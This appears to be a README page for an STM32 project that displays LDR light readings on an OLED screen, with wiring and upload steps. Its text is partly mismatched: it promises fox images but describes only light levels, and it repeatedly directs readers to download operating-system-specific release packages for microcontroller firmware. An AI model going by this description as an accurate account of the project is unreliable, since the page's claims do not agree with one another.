---
layout: "default"
title: "🌟 stm32-ldr-oled-fox-display - Simple Display and Sensor System"
description: "🦊 Display light-reactive fox images on an OLED using STM32 and an LDR, enhancing engagement with simple and educational embedded programming."
---
# 🌟 stm32-ldr-oled-fox-display - Simple Display and Sensor System

## 📦 Download Now!
[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Gabrielyop50/stm32-ldr-oled-fox-display/releases)

## 🚀 Getting Started
This application utilizes an OLED display and an LDR sensor to show light levels, providing a practical project for beginners in electronics and embedded systems. It uses the STM32f103c8t6 microcontroller as its brain, making it a great introduction to microcontroller programming and circuit design.

### 📋 Features
- **OLED Display**: A 0.96-inch display shows real-time light levels.
- **LDR Sensor**: Measures ambient light effectively.
- **User-Friendly Interface**: Designed for non-technical users.
- **Arduino Compatibility**: Supports Arduino IDE for easy programming.

## ✅ System Requirements
To run this application, you will need:
- **Hardware**
  - STM32f103c8t6 microcontroller (Blue Pill)
  - OLED display (0.96 inch, SSD1306 compatible)
  - LDR (Light Dependent Resistor)
  - 10kΩ resistor for the LDR
  - Jumper wires and breadboard for connections

- **Software**
  - Windows, macOS, or Linux operating system
  - STM32CubeIDE or Arduino IDE installed (whichever you prefer)

## 📥 Download & Install
1. Click the link below to visit the releases page:
   [Download from Releases Page](https://github.com/Gabrielyop50/stm32-ldr-oled-fox-display/releases)
   
2. On the releases page, look for the latest version.
   
3. Download the package suitable for your operating system.

4. Extract the downloaded files if necessary.

5. Follow the instructions in the included README file to set up the application on your device.

## 💻 Connecting the Hardware
1. Gather your components:
   - STM32f103c8t6 microcontroller
   - OLED display
   - LDR
   - Resistors and jumper wires

2. Connect the OLED display to the STM32 as follows:
   - VCC to 3.3V
   - GND to Ground
   - SDA to I2C Data Pin (e.g., PB7)
   - SCL to I2C Clock Pin (e.g., PB6)

3. Connect the LDR in a voltage divider circuit:
   - One end of the LDR to VCC
   - The other end connected to one end of a resistor (10kΩ).
   - Connect the other end of the resistor to Ground.
   - Take the middle point (between LDR and resistor) to an analog input on the STM32.

## 📊 Running the Application
1. Open the STM32CubeIDE or Arduino IDE.
   
2. Import the project from the downloaded files.

3. Compile the code and upload it to your STM32 microcontroller.

4. Once uploaded, power your STM32 with a USB cable or battery.

5. The OLED display should show the ambient light levels detected by the LDR.

## ⚙️ Troubleshooting
If you encounter issues:
- Ensure all connections are secure.
- Verify the correct board is selected in your IDE.
- Check if the libraries for the OLED display are installed.

## 📝 Additional Resources
- **Documentation**: Check the documentation for specific library usage.
- **Community**: Join forums or groups related to STM32 development for support.

[Download from Releases Page](https://github.com/Gabrielyop50/stm32-ldr-oled-fox-display/releases) for the latest version and updates. 

## 🛠️ Contributing
If you want to contribute to this project, feel free to fork the repository and make improvements. Please adhere to the community guidelines for contributions.

## 📞 Support
For support, open an issue in the repository or reach out through the community channels. 

Happy building!